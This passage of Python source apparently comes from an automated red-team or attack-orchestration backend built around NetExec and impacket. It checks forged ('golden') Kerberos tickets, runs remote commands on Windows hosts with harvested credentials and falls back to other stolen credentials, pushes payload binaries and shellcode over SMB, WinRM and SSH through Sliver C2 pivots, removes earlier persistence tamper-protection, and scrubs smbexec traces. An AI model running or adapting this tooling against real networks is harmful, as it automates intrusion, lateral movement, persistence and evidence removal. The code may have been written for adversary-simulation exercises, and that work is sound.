        with `KRB5CCNAME` pointed at the golden ccache. Success (rc 0 → a
        `<principal>.ccache` service ticket) proves the KDC accepts the ticket
        AND the target SPN exists — the DNS-independent fallback when SSH is
        unreachable. Returns (ok, detail).
        """
        import tempfile  # cycle-break

        from fastapi_backend.core.config import config  # cycle-break

        if not shutil.which("impacket-getST"):
            return False, "impacket-getST not on PATH"
        env = {**os.environ, "KRB5CCNAME": str(ccache_path)}
        args = [
            "impacket-getST", "-k", "-no-pass",
            "-dc-ip", kdc_ip, "-spn", spn,
            f"{realm.upper()}/{principal}",
        ]
        ct = int(timeout or config.GETST_TIMEOUT)
        with tempfile.TemporaryDirectory(prefix="c3r_getst_") as td:
            try:
                proc = await asyncio.create_subprocess_exec(  # nxc-wrapper-bypass: impacket-getST, not an nxc op
                    *args,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                    env=env,
                    cwd=td,
                )
                out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=ct)
            except TimeoutError:
                with contextlib.suppress(ProcessLookupError):
                    proc.kill()
                return False, "getST timeout"
            out = out_b.decode(errors="replace")
        if proc.returncode == 0 and ("Saving ticket" in out or "saved" in out.lower()):
            return True, f"getST: service ticket for {spn} obtained"
        return False, f"getST-failed: {out.strip().splitlines()[-1][:200] if out.strip() else f'rc={proc.returncode}'}"

    async def execute_cred(
        self,
        host: str,
        protocol: str,
        cred: "Credentials",
        command: str,
        powershell: bool = False,
        port: int | None = None,
        exec_method: str | None = None,
        kdc_host: str | None = None,
        retrieve_output: bool = True,
        sweep_after: bool = False,
        *,
        box_ip: str | None = None,
    ) -> NXCResult:
        """Cred-aware variant of `execute()` — branches on cred.cred_type.

        Use this when the caller already has a Credentials row in hand; it
        handles password / nthash / ccache transparently. For ccache rows,
        the ccache file is materialized to disk and KRB5CCNAME is set on the
        subprocess env automatically.

        ``retrieve_output`` / ``sweep_after`` behave exactly as in ``execute()``
        (docs/PLAN_kill_nxc_readback.md): the former suppresses smbexec's C$
        readback file, the latter scrubs any smbexec leftover after the call.
        """
        args, env = self._build_cred_args(protocol, host, cred, port=port, kdc_host=kdc_host)
        if exec_method and protocol == "smb":
            args += ["--exec-method", exec_method]
        if not retrieve_output and protocol == "smb":
            args.append("--no-output")
        args += ["-X" if powershell else "-x", command]
        result = await self._run(args, host, protocol, env_extra=env or None, box_ip=box_ip)
        if (
            exec_method
            and protocol == "smb"
            and not result.success
            and _EXEC_FAILURE_RE.search(result.raw)
        ):
            self.logger.warning(
                "exec-method %s failed for %s, retrying with NXC default", exec_method, host
            )
            fallback_args, fallback_env = self._build_cred_args(
                protocol, host, cred, port=port, kdc_host=kdc_host
            )
            if not retrieve_output and protocol == "smb":
                fallback_args.append("--no-output")
            fallback_args += ["-X" if powershell else "-x", command]
            result = await self._run(
                fallback_args, host, protocol, env_extra=fallback_env or None, box_ip=box_ip,
            )
            if result.success:
                self.logger.info("Fallback exec method succeeded for %s", host)

        # Cross-cred fallback: primary cred hit an auth-rejection sentinel
        # (STATUS_LOGON_FAILURE / STATUS_NO_LOGON_SERVERS / KRB_AP_ERR_SKEW / ...).
        # Retry ONCE with the box's next-best cred so a stale local red_scoring
        # doesn't lock the box out when a domain row is still valid, and a
        # SKELD-class Kerberos-skew flip transparently retries via the local
        # SAM row. Capped at 1 fallback attempt to bound wall-clock.
        if (
            not result.success
            and _AUTH_FALLBACK_RE.search(result.raw or "")
        ):
            alt = self._resolve_fallback_cred(box_ip or host, protocol, cred)
            if alt is not None and getattr(alt, "cred_id", None) != getattr(cred, "cred_id", None):
                self.logger.warning(
                    "cross-cred fallback on %s: primary %s auth-failed (%s); "
                    "retrying with next-best cred %s",
                    box_ip or host, cred.username,
                    (result.error or "").strip()[:120], alt.username,
                )
                alt_args, alt_env = self._build_cred_args(
                    protocol, host, alt, port=port, kdc_host=kdc_host,
                )
                if exec_method and protocol == "smb":
                    alt_args += ["--exec-method", exec_method]
                if not retrieve_output and protocol == "smb":
                    alt_args.append("--no-output")
                alt_args += ["-X" if powershell else "-x", command]
                result = await self._run(
                    alt_args, host, protocol, env_extra=alt_env or None, box_ip=box_ip,
                )
                if result.success:
                    self.logger.info(
                        "cross-cred fallback succeeded on %s with %s",
                        box_ip or host, alt.username,
                    )

        # Track NXC result for box unreachable detection
        await nxc_failure_tracker.record_result(box_ip or host, result.success)
        if sweep_after and protocol == "smb":
            await self.cleanup_smbexec_artifacts_cred(host, cred, port=port)
        return result

    async def cleanup_smbexec_artifacts(
        self, host: str, username: str, password: str, *,
        port: int | None = None, recent_only: bool = True,
    ) -> None:
        r"""Scrub smbexec readback/batch leftovers on a Windows box's C:\.

        ``recent_only=True`` (default) sweeps only files modified in the last 5
        minutes — the per-exec artifact.  ``recent_only=False`` sweeps ALL
        matching leftovers regardless of age (the SA-cycle defensive sweep,
        which clears historical leaks).  Delivered ``retrieve_output=False`` (no
        readback file of its own) and ``sweep_after=False`` (no recursion).
        Best-effort — never raises.
        """
        try:
            await self.execute(  # nxc-wrapper-bypass: internal-adapter
                host, "smb", username, password, _smbexec_sweep_ps(recent_only),
                powershell=True, exec_method="smbexec",
                retrieve_output=False, sweep_after=False, port=port,
            )
        except Exception as exc:  # janitor must not break callers
            self.logger.warning("smbexec artifact sweep failed for %s: %s", host, exc)

    async def cleanup_smbexec_artifacts_cred(
        self, host: str, cred: "Credentials", *,
        port: int | None = None, recent_only: bool = True,
    ) -> None:
        """Cred-typed variant of ``cleanup_smbexec_artifacts`` (SA / harvest paths)."""
        try:
            await self.execute_cred(  # nxc-wrapper-bypass: internal-adapter
                host, "smb", cred, _smbexec_sweep_ps(recent_only),
                powershell=True, exec_method="smbexec",
                retrieve_output=False, sweep_after=False, port=port,
            )
        except Exception as exc:  # janitor must not break callers
            self.logger.warning("smbexec artifact sweep (cred) failed for %s: %s", host, exc)

    async def put_file_cred(
        self,
        host: str,
        protocol: str,
        cred: "Credentials",
        local_path: str | Path,
        remote_path: str,
        port: int | None = None,
        kdc_host: str | None = None,
        db: "Session | None" = None,
    ) -> NXCResult:
        """Cred-aware variant of `put_file()`. See `execute_cred` notes.

        On repeated transient SMB failure, the file push escalates SMB -> WinRM
        -> SSH when NXC_ALT_DELIVERY_ENABLED (docs/PLAN_windows_delivery_fallback.md).
        Pass ``db`` to enable the SSH tier (needs the nmap SA port map); without
        it only the WinRM tier is available.
        """
        if cred.cred_type == "ccache" and protocol != "smb":
            # NXC SSH does not honor -k for ccache-based auth (no GSSAPI flow).
            raise ValueError("ccache credentials only support SMB put_file")

        async def _push(active_cred: "Credentials") -> NXCResult:
            if protocol == "smb":
                r = await self._put_file_smb_reliable(
                    host=host, local_path=local_path, remote_path=remote_path,
                    port=port, cred=active_cred, kdc_host=kdc_host,
                )
                if (not r.success) and _TRANSIENT_PUT_RE.search(r.error or ""):
                    alt = await self._maybe_alt_deliver(
                        host, active_cred, local_path, remote_path, db,
                    )
                    if alt is not None:
                        return alt[0]
                return r
            if protocol == "ssh":
                return await self._put_file_ssh_reliable(
                    host=host, local_path=local_path, remote_path=remote_path,
                    port=port, cred=active_cred, kdc_host=kdc_host,
                )
            _a, _e = self._build_cred_args(
                protocol, host, active_cred, port=port, kdc_host=kdc_host,
            )
            _a += ["--put-file", str(local_path), remote_path]
            return await self._run(_a, host, protocol, env_extra=_e or None)

        result = await _push(cred)

        # Cross-cred fallback: primary cred auth-rejected — retry once with
        # the box's next-best cred so a stale local `.\red_scoring` doesn't
        # block payload delivery when a domain row is still valid, and a
        # SKELD-class Kerberos-skew flip transparently retries via the
        # alternative row. Mirrors execute_cred's fallback path.
        if (
            not result.success
            and _AUTH_FALLBACK_RE.search(result.raw or "" if hasattr(result, "raw") else "")
        ):
            alt_cred = self._resolve_fallback_cred(host, protocol, cred)
            if alt_cred is not None and getattr(alt_cred, "cred_id", None) != getattr(cred, "cred_id", None):
                self.logger.warning(
                    "cross-cred put_file fallback on %s: primary %s auth-failed (%s); "
                    "retrying with next-best cred %s",
                    host, cred.username,
                    (result.error or "").strip()[:120], alt_cred.username,
                )
                result = await _push(alt_cred)
                if result.success:
                    self.logger.info(
                        "cross-cred put_file fallback succeeded on %s with %s",
                        host, alt_cred.username,
                    )
        return result

    async def _maybe_alt_deliver(
        self,
        host: str,
        cred: "Credentials",
        local_path: str | Path,
        remote_path: str,
        db: "Session | None",
    ) -> "tuple[NXCResult, str] | None":
        r"""Escalate a transient SMB put failure to the WinRM/SSH tiers.

        ``remote_path`` here is share-relative (drive letter stripped, e.g.
        ``\Windows\Temp\x``); WinRM/PowerShell needs the full exec-form path,
        so reconstruct ``C:`` + share path. Returns whatever try_alt_delivery
        returns (see its docstring), or None when the module can't be reached.
        """
        from fastapi_backend.netexec.alt_delivery import try_alt_delivery  # cycle-break

        exec_path = _smb_full_path(str(remote_path))
        return await try_alt_delivery(
            self, host, "windows", cred.username, getattr(cred, "password", None),
            cred, local_path, exec_path, db,
        )

    async def _put_file_smb_reliable(
        self,
        *,
        host: str,
        local_path: str | Path,
        remote_path: str,
        port: int | None = None,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> NXCResult:
        """Reliable SMB put_file: per-box serialization + retries + hash verify.

        Deadlock-freedom (see the wrapper._run acquire-order comments + the two
        prior incidents they document): the per-box PUT_FILE semaphore is the
        OUTERMOST lock, acquired here BEFORE _run acquires per-box then global.
        Global order is putfile -> per_box -> global; the exec path never
        touches putfile, so no lock-order cycle can form. Limit 1/box means a
        slow upload holds only ONE of the box's per-box slots (leaving the rest
        for exec) — no starvation. The permit is held across the whole retry
        loop, so uploads to the same box stay strictly serialized.
        """
        from fastapi_backend.core.config import config  # cycle-break
        from fastapi_backend.netexec.nxc_semaphore import (  # cycle-break
            get_acquire_executor,
            get_per_box_putfile_semaphore,
            get_pivot_putfile_semaphore,
        )

        loop = asyncio.get_running_loop()
        # Pivot loopback uploads share one Sliver gRPC channel — cap total
        # concurrent pivot put-files GLOBALLY (outermost, before the per-box
        # sem) so heavy 785KB transfers don't starve each other past the 180s
        # timeout (soak Z 2026-08-28). Consistent acquire order (pivot-global →
        # per-box put-file → per-box exec → global) means no lock-order cycle.
        is_pivot = host in ("127.0.0.1", "localhost", "::1")
        pivot_sem = get_pivot_putfile_semaphore() if is_pivot else None
        if pivot_sem is not None:
            await loop.run_in_executor(get_acquire_executor(), pivot_sem.acquire)
        putfile_sem = get_per_box_putfile_semaphore(host)
        await loop.run_in_executor(get_acquire_executor(), putfile_sem.acquire)
        try:
            local_hash: str | None = None
            if config.NXC_PUTFILE_VERIFY_HASH:
                local_hash = await asyncio.to_thread(_sha256_file, local_path)
            full_remote = _smb_full_path(remote_path)
            max_retries = max(1, config.NXC_PUTFILE_MAX_RETRIES)
            last: NXCResult | None = None
            _did_clear = False  # ACCESS_DENIED-driven residue clear runs at most once per put_file
            for attempt in range(1, max_retries + 1):
                last = await self._smb_put_once(
                    host, local_path, remote_path, port,
                    username=username, password=password, cred=cred, kdc_host=kdc_host,
                )
                ok = last.success
                if ok and local_hash is not None:
                    matched = await self._smb_remote_hash_matches(
                        host, full_remote, local_hash, port,
                        username=username, password=password, cred=cred, kdc_host=kdc_host,
                    )
                    if matched is False:
                        # Genuine mismatch — the write landed but is wrong. Retry.
                        ok = False
                        last = NXCResult(
                            success=False, output=last.output, host=host, protocol="smb",
                            error="put_file hash mismatch (remote file did not match local after write)",
                            raw=last.raw,
                        )
                    elif matched is None:
                        # Verification itself could not run (faulted exec / no output).
                        # The write reported success and we have no evidence against it,
                        # so accept it rather than re-uploading the whole binary up to
                        # NXC_PUTFILE_MAX_RETRIES times on no evidence at all — that
                        # amplified load 5x per affected upload and still ended in a
                        # bogus "did not match" verdict.
                        self.logger.warning(
                            "put_file to %s: hash verification unavailable; accepting the "
                            "write on NXC's own success report (file NOT verified)", host,
                        )
                if ok:
                    if attempt > 1:
                        self.logger.info(
                            "put_file to %s succeeded on attempt %d/%d", host, attempt, max_retries
                        )
                    return last
                # Only retry TRANSIENT transport failures. A hash mismatch (write
                # landed but corrupt) is worth another attempt; a deterministic
                # NXC error (bad path, perms) will fail identically every time —
                # fail fast instead of burning all retries + backoff on it.
                err_txt = (last.error or "") if last else ""
                retryable = ("hash mismatch" in err_txt) or bool(_TRANSIENT_PUT_RE.search(err_txt))
                if not retryable:
                    # STATUS_ACCESS_DENIED (0xc0000022) on the C$ share is often not a
                    # PERMISSION failure but a residue collision: a prior deploy planted
                    # this same pooled DLL name AND applied `attrib +R` + `icacls /deny
                    # Everyone:(W,D,DC)` to tamper-protect it (see
                    # iocs/deploy_scripts/windows/persistence/attrib_icacls_deploy.ps1),
                    # and the current deploy's overwrite is blocked by that DENY ACE.
                    # Measured 2026-08-18: 31 non-transient put_file failures, all
                    # STATUS_ACCESS_DENIED on pooled DLL names — my earlier
                    # Guest-rejection + circuit-breaker cleared the auth cluster and
                    # unmasked this residue class. Do a one-shot clear (strip R,
                    # remove DENY, delete) and retry once. Idempotent on a fresh box
                    # (nothing to strip) and self-limiting (_did_clear guard).
                    _have_auth = bool((username and password) or cred is not None)
                    if (
                        not _did_clear
                        and "STATUS_ACCESS_DENIED" in err_txt
                        and _have_auth
                    ):
                        _did_clear = True
                        cleared = await self._clear_smb_deny_residue(
                            host=host, remote_path=remote_path, port=port,
                            username=username, password=password,
                            cred=cred, kdc_host=kdc_host,
                        )
                        if cleared:
                            self.logger.warning(
                                "put_file to %s dest=%r: cleared prior-deploy protection "
                                "(attrib+R / DENY ACE), retrying once",
                                host, remote_path,
                            )
                            continue
                        self.logger.warning(
                            "put_file to %s dest=%r: clear+retry attempted but the "
                            "clear exec did not succeed; falling through to the "
                            "non-retryable failure path",
                            host, remote_path,
                        )
                    self.logger.warning(
                        "put_file to %s dest=%r failed with non-transient error "
                        "(no retry): %s",
                        host, remote_path, err_txt,
                    )
                    return last
                if attempt < max_retries:
                    delay = config.NXC_PUTFILE_RETRY_BACKOFF_SEC * attempt
                    self.logger.warning(
                        "put_file to %s attempt %d/%d failed (%s); retrying in %.1fs",
                        host, attempt, max_retries, err_txt or "unknown", delay,
                    )
                    await asyncio.sleep(delay)
            return last  # type: ignore[return-value]  # loop runs >=1 time
        finally:
            putfile_sem.release()
            if pivot_sem is not None:
                pivot_sem.release()

    async def _put_file_ssh_reliable(
        self,
        *,
        host: str,
        local_path: str | Path,
        remote_path: str,
        port: int | None = None,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> NXCResult:
        """Reliable SSH put_file: per-box serialization + retries + hash verify.

        Mirrors ``_put_file_smb_reliable`` but for SSH targets, using its OWN
        timeout (``NXC_PUTFILE_SSH_TIMEOUT``, default 600 s) via ``_run``'s
        ``timeout_override``. Motivation: large binary payloads
        (linux_fake_ntpd 785 KB, linux_kill_shim 785 KB, self_inject_linux
        765 KB, self_inject_freebsd 4.4 MB, plus 17 MB shellcode files) hit
        the flat 120 s ``NXC_TIMEOUT`` when routed through a pfSense pivot
        portfwd under the full-deploy preflight load (surfaced 2026-08-25
        soak, docs/PLAN_ssh_putfile_reliable.md).

        Deadlock-freedom mirrors the SMB path: the per-box put_file semaphore
        is the OUTERMOST lock, acquired here BEFORE ``_run`` acquires per-box
        + global. Global order is put_file → per_box → global; SSH exec never
        touches the put_file semaphore, so no lock-order cycle can form. The
        semaphore itself is shared with the SMB path — the constraint is
        per-box bandwidth, protocol-agnostic.
        """
        from fastapi_backend.core.config import config  # cycle-break
        from fastapi_backend.netexec.nxc_semaphore import (  # cycle-break
            get_acquire_executor,
            get_per_box_putfile_semaphore,
            get_pivot_putfile_semaphore,
        )

        loop = asyncio.get_running_loop()
        # Pivot loopback uploads share one Sliver gRPC channel — cap total
        # concurrent pivot put-files GLOBALLY (outermost, before the per-box
        # sem) so heavy 785KB transfers don't starve each other past the 180s
        # timeout (soak Z 2026-08-28). Consistent acquire order (pivot-global →
        # per-box put-file → per-box exec → global) means no lock-order cycle.
        is_pivot = host in ("127.0.0.1", "localhost", "::1")
        pivot_sem = get_pivot_putfile_semaphore() if is_pivot else None
        if pivot_sem is not None:
            await loop.run_in_executor(get_acquire_executor(), pivot_sem.acquire)
        putfile_sem = get_per_box_putfile_semaphore(host)
        await loop.run_in_executor(get_acquire_executor(), putfile_sem.acquire)
        try:
            local_hash: str | None = None
            if config.NXC_PUTFILE_SSH_VERIFY_HASH:
                local_hash = await asyncio.to_thread(_sha256_file, local_path)
            max_retries = max(1, config.NXC_PUTFILE_SSH_MAX_RETRIES)
            last: NXCResult | None = None
            for attempt in range(1, max_retries + 1):
                last = await self._ssh_put_once(
                    host, local_path, remote_path, port,
                    username=username, password=password, cred=cred, kdc_host=kdc_host,
                )
                ok = last.success
                if ok and local_hash is not None:
                    matched = await self._ssh_remote_hash_matches(
                        host, remote_path, local_hash, port,
                        username=username, password=password, cred=cred, kdc_host=kdc_host,
                    )
                    if matched is False:
                        ok = False
                        last = NXCResult(
                            success=False, output=last.output, host=host, protocol="ssh",
                            error="put_file hash mismatch (remote file did not match local after write)",
                            raw=last.raw,
                        )
                    elif matched is None:
                        # Verification itself could not run (no sha256sum + no sha256
                        # on target; NXC exec fault; empty output). Accept the
                        # write on NXC's own success report rather than burning the
                        # retry budget re-uploading a 4 MB binary that's almost
                        # certainly fine — mirrors the SMB reliable path's
                        # "verification unavailable" branch.
                        self.logger.warning(
                            "put_file to %s: SSH hash verification unavailable; accepting the "
                            "write on NXC's own success report (file NOT verified)", host,
                        )
                if ok:
                    if attempt > 1:
                        self.logger.info(
                            "put_file to %s succeeded on attempt %d/%d", host, attempt, max_retries
                        )
                    return last
                # Per-attempt rebuild on timeout: AWAIT the rebuild and
                # RE-TARGET the next attempt onto the fresh portfwd port. The
                # old fire-and-forget rebuild updated the DB but the retry kept
                # hammering the same dead `port`, so all 3 attempts timed out on
                # a stale port (soak Y 2026-08-28: 3×180s=540s blew the 600s
                # operator-task budget while the rebuild it fired only helped a
                # future deploy). rebuild_portfwd_await coalesces concurrent
                # callers for the same dead port and returns the new ssh port.
                if (
                    config.NXC_PIVOT_REBUILD_ON_TIMEOUT
                    and host in ("127.0.0.1", "localhost", "::1")
                    and "Timeout after" in ((last.error if last else "") or "")
                    and port is not None
                ):
                    try:
                        from fastapi_backend.c2.sliver_manager import (
                            sliver_manager,  # cycle-break
                        )
                        new_port = await sliver_manager.rebuild_portfwd_await(port)
                        if new_port is not None and new_port != port:
                            self.logger.warning(
                                "put_file to 127.0.0.1:%d attempt %d/%d Timeout; "
                                "portfwd rebuilt → retrying on fresh port %d",
                                port, attempt, max_retries, new_port,
                            )
                            port = new_port
                        else:
                            self.logger.warning(
                                "put_file to 127.0.0.1:%d attempt %d/%d Timeout; "
                                "portfwd rebuild returned no fresh port",
                                port, attempt, max_retries,
                            )
                    except Exception as exc:
                        self.logger.warning(
                            "put_file rebuild request failed for port %d: %s", port, exc,
                        )
                if attempt < max_retries:
                    delay = config.NXC_PUTFILE_RETRY_BACKOFF_SEC * attempt
                    self.logger.warning(
                        "put_file to %s attempt %d/%d failed (%s); retrying in %.1fs",
                        host, attempt, max_retries, (last.error if last else "unknown") or "unknown", delay,
                    )
                    await asyncio.sleep(delay)
            return last  # type: ignore[return-value]  # loop runs >=1 time
        finally:
            putfile_sem.release()
            if pivot_sem is not None:
                pivot_sem.release()

    async def _ssh_put_once(
        self,
        host: str,
        local_path: str | Path,
        remote_path: str,
        port: int | None,
        *,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> NXCResult:
        """One SSH put attempt with the extended timeout, plus SFTP-failure escalation.

        Mirrors the previous inline SSH-put logic in ``put_file`` (SFTP "Channel
        closed" → scp -O fallback; "Error writing file: … Failure" (SFTP error 4)
        → scp -O fallback; other write errors → success=False). Now runs under
        ``NXC_PUTFILE_SSH_TIMEOUT`` so a slow pivot portfwd doesn't guillotine
        the write at 120 s.
        """
        from fastapi_backend.core.config import config  # cycle-break

        if cred is not None:
            args, env = self._build_cred_args("ssh", host, cred, port=port, kdc_host=kdc_host)
            args += ["--put-file", str(local_path), remote_path]
            result = await self._run(
                args, host, "ssh", env_extra=env or None,
                timeout_override=config.NXC_PUTFILE_SSH_TIMEOUT,
            )
        else:
            args = self._build_base_args("ssh", host, username, password, port=port)
            args += ["--put-file", str(local_path), remote_path]
            result = await self._run(
                args, host, "ssh",
                timeout_override=config.NXC_PUTFILE_SSH_TIMEOUT,
            )
        # SFTP-subsystem-missing (pfSense/embedded) → scp -O fallback.
        if result.success and "Channel closed" in result.raw:
            self.logger.warning(
                "put_file to %s: SFTP subsystem unavailable (Channel closed), "
                "falling back to scp -O", host,
            )
            return await self._scp_put_file(
                host, username or (cred.username if cred else ""),
                password or (cred.password if cred else ""),
                local_path, remote_path, port,
            )
        # SFTP "Failure" (error code 4) — unreliable on large files → scp -O.
        if result.success and "Error writing file" in result.raw:
            error_lines = [ln for ln in result.raw.splitlines() if "Error writing file" in ln]
            is_sftp_failure = all(ln.rstrip().endswith(": Failure") for ln in error_lines)
            if is_sftp_failure:
                self.logger.warning(
                    "put_file to %s: SFTP 'Failure' error — falling back to scp -O "
                    "(SFTP error code 4 unreliable for large files on some SSH servers)",
                    host,
                )
                return await self._scp_put_file(
                    host, username or (cred.username if cred else ""),
                    password or (cred.password if cred else ""),
                    local_path, remote_path, port,
                )
            # Non-SFTP-code-4 write error — genuine failure.
            stripped = [_PREFIX_RE.sub("", ln) for ln in error_lines]
            return NXCResult(
                success=False, output=result.output, host=result.host, protocol=result.protocol,
                error=stripped[0] if stripped else "Error writing file", raw=result.raw,
            )
        return result

    async def _ssh_remote_hash_matches(
        self,
        host: str,
        remote_path: str,
        local_hash: str,
        port: int | None,
        *,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> "bool | None":
        """Compare the remote file's SHA256 to ``local_hash`` over SSH.

        Tri-state (mirror _smb_remote_hash_matches):
          True  — remote hash read back and matches.
          False — remote hash read back and DIFFERS (real corruption).
          None  — verification could not run (no sha256sum + no sha256, or the exec
                  itself faulted); the write's own success report stands.

        Tries GNU coreutils ``sha256sum`` (Linux) then BSD ``sha256 -q``
        (pfSense/FreeBSD). Uses the SHORT ``NXC_TIMEOUT`` (default 120 s) —
        hashing a few MB is milliseconds even over a pivot, and a stalled
        verify shouldn't chew into the put_file retry budget.
        """
        # Two-shell probe: prefer sha256sum's `hex  path` output, then BSD
        # sha256 -q's bare hex. Print via a token so we can pluck the hash
        # out of noise.
        token = "C3RSHA"
        cmd = (
            f"h=$(sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'); "
            f'if [ -z "$h" ]; then h=$(sha256 -q {remote_path} 2>/dev/null); fi; '
            f'echo {token}$h{token}'
        )
        try:
            if cred is not None:
                res = await self.execute_cred(host, "ssh", cred, cmd, port=port, kdc_host=kdc_host)
            elif username and password:
                res = await self.execute(host, "ssh", username, password, cmd, port=port)
            else:
                return None
        except Exception:
            return None
        if not res or not res.success:
            return None
        m = re.search(rf"{token}([0-9a-fA-F]*){token}", (res.raw or "") + " " + (res.output or ""))
        if not m or not m.group(1):
            return None
        return m.group(1).lower() == local_hash.lower()

    async def _clear_smb_deny_residue(
        self,
        *,
        host: str,
        remote_path: str,
        port: int | None,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> bool:
        r"""Best-effort clear of a prior-deploy's tamper-protection residue.

        Strips ``attrib +R`` + `icacls /deny Everyone:(W,D,DC)` at ``remote_path``
        on the C$ share, then deletes the file.

        Runs one nxc exec (cmd `&`-chain): ``attrib -R & icacls /remove:d Everyone
        & del /F``. Idempotent — a fresh box (no file) is a no-op. Routes through
        ``execute_cred`` when the caller supplied a ``cred`` row (put_file_cred
        path — bulk_put_file, _stage_backup_copy) and through ``execute`` when it
        supplied bare ``username``/``password`` (put_file path — pivot deploy).
        Returns True when the exec appeared to run (regardless of whether the file
        existed); returns False if the exec itself couldn't complete. Called by
        _put_file_smb_reliable's ACCESS_DENIED bailout ONCE per put_file.
        """
        # Reconstruct C:\... from a share-relative dest (put_file received e.g.
        # \Windows\System32\<name>.dll after the wrapper's drive strip).
        abs_path = _smb_full_path(remote_path)
        # cmd `&` chains — semicolons are NOT statement separators in cmd. Each
        # step's failure is tolerated (attrib on a missing file returns 1, etc.).
        cmd = (
            f'attrib -R "{abs_path}" & '
            f'icacls "{abs_path}" /remove:d Everyone & '
            f'del /F /Q "{abs_path}"'
        )
        try:
            if cred is not None:
                res = await self.execute_cred(
                    host, "smb", cred, cmd, port=port, kdc_host=kdc_host,
                )
            elif username and password:
                res = await self.execute(
                    host, "smb", username, password, cmd, port=port,
                )
            else:
                self.logger.warning(
                    "clear_smb_deny_residue on %s dest=%r skipped: no cred / creds "
                    "provided", host, remote_path,
                )
                return False
        except Exception as exc:
            self.logger.warning(
                "clear_smb_deny_residue on %s dest=%r failed to exec: %s",
                host, remote_path, exc,
            )
            return False
        # Auth OK is sufficient signal — the cmd chain tolerates each step's
        # failure, and the write retry will surface a genuine still-blocked state.
        return bool(res and res.success)

    async def _smb_put_once(
        self,
        host: str,
        local_path: str | Path,
        remote_path: str,
        port: int | None,
        *,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> NXCResult:
        """One SMB put attempt via _run, with the NXC write-failure override.

        NXC prints [+] (auth OK) even when the C$ write itself failed, so
        _parse_output would report success — detect "Error writing file" in raw
        and flip success=False so the retry loop (and hash verify) react.
        """
        if cred is not None:
            args, env = self._build_cred_args("smb", host, cred, port=port, kdc_host=kdc_host)
            args += ["--put-file", str(local_path), remote_path]
            r = await self._run(args, host, "smb", env_extra=env or None)
        else:
            args = self._build_base_args("smb", host, username, password, port=port)
            args += ["--put-file", str(local_path), remote_path]
            r = await self._run(args, host, "smb")
        if r.success and "Error writing file" in r.raw:
            lines = [ln for ln in r.raw.splitlines() if "Error writing file" in ln]
            stripped = [_PREFIX_RE.sub("", ln) for ln in lines]
            r = NXCResult(
                success=False, output=r.output, host=r.host, protocol=r.protocol,
                error=stripped[0] if stripped else "Error writing file", raw=r.raw,
            )
        return r

    async def _smb_remote_hash_matches(
        self,
        host: str,
        full_remote: str,
        local_hash: str,
        port: int | None,
        *,
        username: str | None = None,
        password: str | None = None,
        cred: "Credentials | None" = None,
        kdc_host: str | None = None,
    ) -> "bool | None":
        """Compare the remote file's SHA256 (Get-FileHash) to ``local_hash``.

        Tri-state on purpose:

        * ``True``  — remote hash read back and matches.
        * ``False`` — remote hash read back and DIFFERS (the file really is wrong).
        * ``None``  — verification could not be performed (exec failed, or the command
          produced no SHA256). This says nothing about the file.

        The distinction matters: an SMB exec can fault (e.g. ``Unknown DCE RPC fault
        status code: 0000``) and return no stdout while NXC still prints a ``[+]`` auth
        line. Collapsing that into ``False`` made every such case report "remote file did
        not match local after write" — a corruption claim about a file that was almost
        certainly written fine — and then burn the full put_file retry budget re-uploading
        it. Observed ~780 times in a single 2026-07-30 suite run across 6 Windows boxes;
        every one was this no-output case (zero logged exec failures), and the old
        collapse-to-False made them indistinguishable from real corruption.
        """
        # Single-quote the path and escape embedded quotes for PowerShell.
        safe = full_remote.replace("'", "''")
        cmd = f"(Get-FileHash -LiteralPath '{safe}' -Algorithm SHA256).Hash"
        if cred is not None:
            r = await self.execute_cred(  # nxc-wrapper-bypass: binary-deploy
                host, "smb", cred, cmd, powershell=True, port=port, kdc_host=kdc_host,
            )
        else:
            r = await self.execute(  # nxc-wrapper-bypass: binary-deploy
                host, "smb", username, password, cmd, powershell=True, port=port,
            )
        if not r.success:
            self.logger.warning(
                "put_file hash-verify exec failed on %s: %s", host, r.error
            )
            return None
        m = _SHA256_RE.search(r.output or "")
        if not m:
            self.logger.warning(
                "put_file hash-verify unavailable (no SHA256 in Get-FileHash output) "
                "from %s: %r", host, (r.output or "")[:200],
            )
            return None
        return m.group(0).lower() == local_hash.lower()

    def _parse_output(self, stdout: str, host: str, protocol: str) -> NXCResult:
        """Strip the nxc per-line prefix and determine success/failure.

        nxc prefixes every line with:  PROTO  IP  PORT  HOSTNAME  <content>

        Success requires BOTH:
          1. A [+] line (auth or exec success)
          2. No exec-method failure lines ([-] wmiexec/smbexec/etc.)

        Exec-method failures override auth success, but only when the command
        did not ultimately execute. NXC sometimes emits [-] wmiexec: Could not
        retrieve output file and then retries, producing [+] Executed command
        in the same output — that is a success, not a failure.
        """
        lines = stdout.splitlines()
        stripped = [_PREFIX_RE.sub("", line) for line in lines]
        output = "\n".join(stripped)

        # NXC prints `[+] DOM\user:pass (Guest)` when the credential did NOT map to
        # a real account and SMB silently fell back to the Guest token. Auth
        # "succeeds" but the session has no rights — a deploy/put_file then fails
        # with a confusing C$ STATUS_ACCESS_DENIED, and an exec returns empty. Treat
        # a Guest-mapped session as an AUTH FAILURE so callers get a clear "guest
        # fallback" error at auth time instead of a misleading downstream denial.
        # Mirrors scripts/infra/create_red_scoring.py::_nxc.
        guest_fallback = any(("[+]" in line and "(Guest)" in line) for line in lines)
        auth_ok = any("[+]" in line for line in lines) and not guest_fallback
        # NXC sometimes emits [-] wmiexec: Could not retrieve output file and
        # then retries, producing [+] Executed command in the same output.
        # Only treat it as a failure when the exec error is present AND the
        # command did NOT ultimately execute (no [+] Executed line).
        exec_succeeded = any("[+] Executed" in line for line in lines)
        exec_failed = (
            not exec_succeeded
            and any(_EXEC_FAILURE_RE.search(line) for line in lines)
        )
        success = auth_ok and not exec_failed

        if success:
            error = None
        elif guest_fallback:
            error = "auth fell back to Guest (credential did not map to a real account)"
        else:
